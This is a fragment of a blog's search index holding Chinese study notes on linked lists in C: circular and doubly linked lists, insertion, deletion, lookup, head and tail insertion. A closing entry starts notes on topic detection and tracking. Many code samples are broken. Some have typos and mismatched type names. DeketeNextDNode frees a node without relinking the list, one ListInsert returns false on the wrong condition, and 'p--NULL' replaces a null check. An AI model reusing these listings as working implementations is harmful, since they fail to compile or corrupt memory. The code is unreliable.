<h3 id="循环单链表"><a href="#循环单链表" class="headerlink" title="循环单链表"></a>循环单链表</h3><h4 id="定义循环单链表"><a href="#定义循环单链表" class="headerlink" title="定义循环单链表"></a>定义循环单链表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span>         <span class="comment">//定义单链表结点类型</span></span><br><span class="line">	ElemType data;            <span class="comment">//每个结点存放一个数据元素</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span>       <span class="comment">//指针指向下一个结点</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化一个循环单链表</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    L = (LNode * )<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));   <span class="comment">//分配一个头结点</span></span><br><span class="line">    <span class="keyword">if</span>(L==null)                 <span class="comment">//内存不足分配失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    L-&gt;next=L;                   <span class="comment">//头结点next指向头结点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断循环单链表是否为空</span></span><br><span class="line"><span class="type">bool</span> Empty(LinkList L)&#123;</span><br><span class="line">	<span class="keyword">if</span>(L-&gt;next == 	L)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断结点p是否为循环单链表的表尾结点</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isTail</span><span class="params">(LinkList L,LNide *p)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;next==L)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>循环单链表可以从任意一个点出发找到任何一个结点</p>
<p>应用场景：在项目中需要经常对表头和表尾进行操作</p>
<h3 id="循环双链表"><a href="#循环双链表" class="headerlink" title="循环双链表"></a>循环双链表</h3><p><img src="/2022/08/10/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/image-20220519202518705.png" alt></p>
<h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p><img src="/2022/08/10/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/image-20220519202611055.png" alt></p>
<p>示意图</p>
<p><img src="/2022/08/10/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/image-20220519202626494.png" alt></p>
<p>判空</p>
<p><img src="/2022/08/10/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/image-20220519202646358.png" alt></p>
<p>寻找表尾</p>
<p><img src="/2022/08/10/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8/image-20220519202653076.png" alt></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>双链表</title>
    <url>/2022/08/10/%E5%8F%8C%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>双链表的初始化、基本操作和遍历</p>
<span id="more"></span>
<h2 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h2><h3 id="初始化（带头结点）"><a href="#初始化（带头结点）" class="headerlink" title="初始化（带头结点）"></a>初始化（带头结点）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125;DNode,*DlinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitDLinkList</span><span class="params">(DLinkList &amp;L)</span>&#123;</span><br><span class="line">    L = (DNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));</span><br><span class="line">    <span class="keyword">if</span>(L==null)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    L-&gt;prior = null;</span><br><span class="line">    L-&gt;next = null;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testDLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">    DLinkList L;</span><br><span class="line">    InitDLinkList(L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/10/%E5%8F%8C%E9%93%BE%E8%A1%A8/image-20220519174125025.png" alt></p>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p>后插操作</p>
<p><img src="/2022/08/10/%E5%8F%8C%E9%93%BE%E8%A1%A8/image-20220519174230546.png" alt></p>
<p><img src="/2022/08/10/%E5%8F%8C%E9%93%BE%E8%A1%A8/image-20220519174327671.png" alt></p>
<p>前插操作：通过双链表的特性可以找到插入位置的前一个结点，再对该结点进行后插操作</p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">DeketeNextDNode</span><span class="params">(DNode *p)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (p==null)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    DNode *q = p-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(q==null)          <span class="comment">//p没有后继</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;next!=null)</span><br><span class="line">        q-&gt;next-&gt;prior=p;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="销毁双链表"><a href="#销毁双链表" class="headerlink" title="销毁双链表"></a>销毁双链表</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DestoryList</span><span class="params">(DLinklist &amp;L)</span>&#123;</span><br><span class="line">    <span class="comment">//循环释放各个数据结点</span></span><br><span class="line">    <span class="keyword">while</span> (L-&gt;next != null)</span><br><span class="line">        DeleteNextDNode(L);</span><br><span class="line">    <span class="built_in">free</span>(L);   <span class="comment">//释放头结点</span></span><br><span class="line">    L=null;    <span class="comment">//头指针指向null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h3><h4 id="后向遍历"><a href="#后向遍历" class="headerlink" title="后向遍历"></a>后向遍历</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(p!=null)&#123;</span><br><span class="line">    <span class="comment">//对结点p做相应处理，eg按位查找按值查找打印等</span></span><br><span class="line">    p=p-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="前向遍历"><a href="#前向遍历" class="headerlink" title="前向遍历"></a>前向遍历</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(p-&gt;prior != null)&#123;</span><br><span class="line">	p=p-&gt;prior;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度:O(n)</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>单链表的基本操作</title>
    <url>/2022/08/09/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>单链表的插入删除和查找操作的原理解析和代码实现</p>
<span id="more"></span>
<h3 id="插入和删除"><a href="#插入和删除" class="headerlink" title="插入和删除"></a>插入和删除</h3><h4 id="按位序插入"><a href="#按位序插入" class="headerlink" title="按位序插入"></a>按位序插入</h4><p>带头结点</p>
<p><img src="/2022/08/09/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220519145908546.png" alt></p>
<p>if i = 6 : p指向NULL，则第i-1节点不存在，直接返回false</p>
<p>时间复杂度：O(n)</p>
<p>不带头节点</p>
<p><img src="/2022/08/09/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220519150604589.png" alt></p>
<p>不带头结点需要一段单独的代码来应对i=1的情况</p>
<h4 id="指定节点的后插操作"><a href="#指定节点的后插操作" class="headerlink" title="指定节点的后插操作"></a>指定节点的后插操作</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,* LinkList</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InserNextNode</span> <span class="params">(LNode *p ,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    <span class="keyword">if</span>(s==<span class="literal">NULL</span>)               <span class="comment">//内存分配失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    s-&gt;data = e;              <span class="comment">//结点s保存数据元素e</span></span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	LNode *p;</span><br><span class="line">   	<span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">	p = L;</span><br><span class="line">	<span class="keyword">while</span> (p! = <span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> InsertNextNode(p,e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度：O(1)</p>
<h4 id="前插操作"><a href="#前插操作" class="headerlink" title="前插操作"></a>前插操作</h4><p>两种方法：（1)传入头节点，依次遍历（2）采用后插方式，将节点p的值赋给新申请的节点，将插入的值赋给节点p</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">insertpriornode</span> <span class="params">(LNode *p, ElemTyoe e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    <span class="keyword">if</span>(s==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    s-&gt;next=p-&gt;next;</span><br><span class="line">    p-&gt;next=s;            <span class="comment">//新结点s连到p结点后</span></span><br><span class="line">    s-&gt;data=p-&gt;data;      <span class="comment">//将p中元素赋值给s</span></span><br><span class="line">    p-&gt;data=e;            <span class="comment">//p中元素覆盖为e</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/09/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220519153009590.png" alt></p>
<p>时间复杂度：O(1)</p>
<h4 id="按位序删除"><a href="#按位序删除" class="headerlink" title="按位序删除"></a>按位序删除</h4><p><img src="/2022/08/09/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220519154105544.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">listdelete</span><span class="params">(linklist &amp;L,<span class="type">int</span> i,elemtype &amp;e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    lnode *p;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    p = L;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    lnode *q=p-&gt;next;</span><br><span class="line">    e = q-&gt;data;</span><br><span class="line">    p-&gt;next=q-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最好时间复杂度：O(1)</p>
<p>最坏/平均时间复杂度：O(n)</p>
<h4 id="指定节点的删除"><a href="#指定节点的删除" class="headerlink" title="指定节点的删除"></a>指定节点的删除</h4><p>下面例子为带头结点的单链表</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">deletenode</span> <span class="params">(lnode *p)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p--<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    lnode *q = p-&gt;next;</span><br><span class="line">    p-&gt;data = p-&gt;next-&gt;data;</span><br><span class="line">    p-&gt;next=q-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度：O(1)</p>
<p>如果p是最后一个节点，只能依次寻找p的前驱，时间复杂度为O(n)</p>
<h3 id="单链表的查找"><a href="#单链表的查找" class="headerlink" title="单链表的查找"></a>单链表的查找</h3><p><img src="/2022/08/09/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220519162949205.png" alt></p>
<h4 id="按位查找"><a href="#按位查找" class="headerlink" title="按位查找"></a>按位查找</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LNode * <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    LNode *p;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    p = L;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">    	j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="按值查找"><a href="#按值查找" class="headerlink" title="按值查找"></a>按值查找</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LNode * <span class="title function_">LocateElem</span><span class="params">(LinkList L,ElemType e)</span>&#123;</span><br><span class="line">    LNode *p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; p-&gt;data != e)</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>平均时间复杂度：O(n)</p>
<h4 id="求表长"><a href="#求表长" class="headerlink" title="求表长"></a>求表长</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Length</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">	<span class="type">int</span> len =<span class="number">0</span>;           <span class="comment">//统计表长</span></span><br><span class="line">	LNode *p = L;</span><br><span class="line">	<span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">		len++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度：O(n)</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>单链表的构造</title>
    <url>/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>带头结点和不带头结点的单链表的代码表示和使用头插法或尾插法建立单链表</p>
<span id="more"></span>
<h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><p><img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220518210935623.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span>                <span class="comment">//定义单链表节点类型</span></span><br><span class="line">    ElemType data;           <span class="comment">//每个节点存放一个数据元素</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span>      <span class="comment">//指针指向像一个节点</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">p</span> =</span> (<span class="keyword">struct</span> LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> LNode));                     <span class="comment">//增加一个新的节点：在内存中申请一个节点所需空间，并用指针p指向这个节点</span></span><br></pre></td></tr></table></figure>
<p>typedef 关键字 —— 数据类型重命名</p>
<p>typedef &lt;数据类型&gt;&lt;别名&gt;</p>
<p><img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220518211715052.png" alt></p>
<p> <img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220518211913545.png" alt></p>
<p>LNode * ：表示return的时一个节点</p>
<p>LinkList L：强调是一个单链表L</p>
<h4 id="不带头节点的单链表"><a href="#不带头节点的单链表" class="headerlink" title="不带头节点的单链表"></a>不带头节点的单链表</h4><p><img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220518212144006.png" alt></p>
<p><img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220518212155476.png" alt></p>
<p>是否为空的判断是头节点是否为NULL</p>
<h4 id="带头结点的单链表"><a href="#带头结点的单链表" class="headerlink" title="带头结点的单链表"></a>带头结点的单链表</h4><p><img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220518212310388.png" alt></p>
<p>不带头节点的单链表在头指针后的data就开始存储数据，带头节点的单链表的第二个节点不存储数据，为NULL</p>
<h3 id="单链表的建立"><a href="#单链表的建立" class="headerlink" title="单链表的建立"></a>单链表的建立</h3><h4 id="尾插法"><a href="#尾插法" class="headerlink" title="尾插法"></a>尾插法</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	ElemType data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化一个单链表</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    L = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//分配一个头结点L</span></span><br><span class="line">    <span class="keyword">if</span>(L==<span class="literal">NULL</span>)                         <span class="comment">//内存不足分配失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;                     <span class="comment">//头结点之后暂时还没有结点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkList L;  <span class="comment">//声明一个指向单链表的指针L</span></span><br><span class="line">    <span class="comment">//初始化一个空表</span></span><br><span class="line">    InitList(L);</span><br><span class="line">    <span class="comment">//······</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220519170717022-16604473981371.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *p;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    p = L;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    s-&gt;data = e;</span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>&#123;</span><br><span class="line">    ListInsert(L,length+<span class="number">1</span>,e);</span><br><span class="line">    length++</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
时间复杂度:O(n^2)</script><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//初始化空表</span></span><br><span class="line">    LNode *s,*r=L;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x!=<span class="number">9999</span>)&#123;</span><br><span class="line">        s=(LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));  <span class="comment">//在r结点之后插入元素x</span></span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        r-&gt;next=s;</span><br><span class="line">        r=s;                             <span class="comment">//永远保持r指向最后一个结点</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next=<span class="literal">NULL</span>;                <span class="comment">//尾结点指针置空</span></span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220519172020891-16604474078162.png" alt></p>
<p>时间复杂度：O(n)</p>
<h4 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">		LNode *s;</span><br><span class="line">		<span class="type">int</span> x;</span><br><span class="line">		L=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));  <span class="comment">//创建头结点</span></span><br><span class="line">		L-&gt;next = <span class="literal">NULL</span>;                     <span class="comment">//初始化为空链表</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">		<span class="keyword">while</span>(x!=<span class="number">9999</span>)&#123;                     <span class="comment">//输入9999表示结束</span></span><br><span class="line">			s = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">			s-&gt;data=x;</span><br><span class="line">			s-&gt;next=L-&gt;next</span><br><span class="line">			L-&gt;next=s;                     <span class="comment">//将新结点插入表中，L为头指针</span></span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（ps：L-&gt;next = NULL是为了避免以前遗留的脏数据）</p>
<p>应用：链表的逆置 </p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>信息内容安全——TDT</title>
    <url>/2022/08/06/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94TDT/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>TDT和几种网络模型的学习以及对网络舆情的了解</p>
<span id="more"></span>
<h2 id="话题检测与跟踪-Topic-Detection-and-Tracking-（TDT）"><a href="#话题检测与跟踪-Topic-Detection-and-Tracking-（TDT）" class="headerlink" title="话题检测与跟踪 Topic Detection and Tracking （TDT）"></a>话题检测与跟踪 Topic Detection and Tracking （TDT）</h2><p>美国国际高级研究计划局（DARPA）于1996年发起倡议，主要用于没有人工干预的情况下自动判断新闻数据流的主题。实现在新闻报道流中发现和跟踪新事件，完成新闻报道边界的自动识别、锁定和发现突发性新闻话题、跟踪话题发生发展过程等相关任务。<br>现在也广泛应用于社交媒体领域</p>
<p><img src="/2022/08/06/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94TDT/image-20220611183609784.png" alt></p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><img src="/2022/08/06/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94TDT/image-20220611183627454.png" alt></p>
